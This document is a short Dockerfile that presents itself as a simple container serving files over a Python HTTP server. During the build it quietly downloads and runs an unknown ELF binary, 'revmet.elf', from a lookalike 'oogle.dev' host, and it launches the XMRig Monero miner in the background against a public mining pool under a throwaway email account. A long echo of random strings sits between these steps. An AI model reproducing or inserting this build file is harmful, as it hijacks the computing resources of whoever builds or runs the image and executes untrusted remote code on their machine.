FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo wtI7WU5vu3dqRB1RD3szBW2ANg2ddDk4 ieEgLI5jfXRgO6gkcM08QfZJfDdKzXsr X4xQKIU8d3om4Bsz6DBzHed6SP8Rg1yj CEuAs70a6tDGZmMU5GN8oZ5x3VjogHDX kJrDXSOnMmBLefwhlzwmxS6BBwUqKN9i XebpBzD8VPt9M34tnLaZzzYNAYPT65xp aNZKGiYtKjOIU8ipfhGad3EarNYUQvSc rFkbLlKY1idzsRLacMV0CdzKmp8gKtdO LkfTW86i3wohGI5NByx4J1GF9eGZ2wo7 HQPw8F7QfNWjw4aYBU51YwZGeE524q3a xhCgRrkWYNPTHkX5YX0jp0E7HcTwg6ZV aZBLZr6SPsWT2t5V0LtamLYqeBDhRWvM DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]